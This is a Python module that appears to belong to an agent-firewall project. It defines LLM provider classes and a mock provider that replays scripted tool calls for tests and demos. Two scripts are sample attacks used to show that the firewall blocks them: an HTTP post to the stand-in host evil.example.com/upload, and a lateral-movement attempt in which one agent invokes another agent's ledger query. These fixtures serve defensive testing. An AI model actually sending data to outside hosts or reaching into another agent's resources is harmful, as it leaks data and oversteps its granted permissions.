"""LLM provider interface: AnthropicProvider (real API) and MockProvider (deterministic scripted
tool calls)."""

from __future__ import annotations

import os
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any


@dataclass
class ToolCall:
    name: str
    arguments: dict[str, Any]


@dataclass
class AgentTurn:
    """One step of the agent loop: either tool calls to make, or a final text response."""

    tool_calls: list[ToolCall] = field(default_factory=list)
    final_text: str | None = None


class Provider(ABC):
    @abstractmethod
    def next_turn(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]]) -> AgentTurn:
        """Given the conversation so far and available tool schemas, decide the next step."""


class MockProvider(Provider):
    """Deterministic, scripted tool-call sequences keyed by scenario name (AGENTFW_CONTEXT.md §6).

    Not random, not an LLM — each scenario names a fixed script; next_turn() replays it one call
    at a time regardless of what the tool actually returned. This is intentional: a real LLM would
    adapt to results, but the point of the mock is reproducibility for CI and for the attack
    scripts, not behavioral realism.
    """

    # WHY these two scenario names specifically: they are M1's own "done when" criteria
    # (AGENTFW_CONTEXT.md §9) — one call that a hardcoded rule allows, one that it denies — kept
    # here rather than invented ad hoc by a test, so the scenario a human runs by hand
    # (`AGENTFW_SCENARIO=m1_allowed_call`) is the exact same script the tests exercise.
    SCRIPTS: dict[str, list[ToolCall]] = {
        "default": [],
        "m1_allowed_call": [
            ToolCall("http.get", {"url": "https://api.trusted-news.com/v2/articles"}),
        ],
        "m1_denied_call": [
            ToolCall("http.post", {"url": "https://evil.example.com/upload", "body": "x"}),
        ],
        # WHY these three (pre-M3 multi-agent ruling): finance-agent and support-agent are now
        # real compose services with their own attested identity — these give each one something
        # true to its own charter to actually do when `docker compose up` runs it, rather than
        # sitting idle. m2_lateral_movement_attempt is the A4 demo script: research_agent asking
        # to invoke finance-agent, denied by east-west default-deny even with a fully valid token.
        "finance_allowed_call": [
            ToolCall("http.post", {"url": "https://api.approved-erp.com/invoices", "body": "{}"}),
        ],
        "support_allowed_call": [
            ToolCall("db.query", {"table": "customers"}),
        ],
        "m2_lateral_movement_attempt": [
            ToolCall(
                "agent.invoke",
                {
                    "target_service": "finance-agent",
                    "tool": "db.query",
                    "arguments": {"table": "ledger"},
                },
            ),
        ],
    }

    def __init__(self, scenario: str | None = None) -> None:
        # WHY constructor param first, env var fallback, never a header: AGENTFW_CONTEXT.md §6
        # (resolved M0) — whatever *drives* the process picks the scenario; a live request must
        # never be able to select its own scripted behaviour.
        self.scenario = scenario or os.environ.get("AGENTFW_SCENARIO", "default")
        self._script = list(self.SCRIPTS.get(self.scenario, []))
        self._step = 0

    def next_turn(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]]) -> AgentTurn:
        del messages, tools  # unused: the mock doesn't adapt to conversation state
        if self._step < len(self._script):
            call = self._script[self._step]
            self._step += 1
            return AgentTurn(tool_calls=[call])
        return AgentTurn(final_text=f"scenario '{self.scenario}' complete")


class AnthropicProvider(Provider):
    """Real API, used only when LLM_PROVIDER=anthropic and a key is present.

    WHY the import is deferred to __init__, not module level: agent/providers.py is imported by
    every code path, including the mock-only run that AGENTFW_CONTEXT.md §1 requires to work with
    no API key. Importing `anthropic` at module scope would make that import always pay for a
    dependency the mock path never uses; deferring it means MockProvider-only runs don't even need
    the package installed correctly, just present.
    """

    def __init__(self, model: str = "claude-sonnet-5") -> None:
        import anthropic

        self._client = anthropic.Anthropic()
        self._model = model

    def next_turn(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]]) -> AgentTurn:
        response = self._client.messages.create(
            model=self._model, max_tokens=1024, messages=messages, tools=tools
        )
        calls = [
            ToolCall(block.name, block.input)
            for block in response.content
            if block.type == "tool_use"
        ]
        text = "".join(block.text for block in response.content if block.type == "text")
        return AgentTurn(tool_calls=calls, final_text=(text or None) if not calls else None)


def get_provider(scenario: str | None = None) -> Provider:
    if os.environ.get("LLM_PROVIDER", "mock") == "anthropic":
        return AnthropicProvider()
    return MockProvider(scenario)
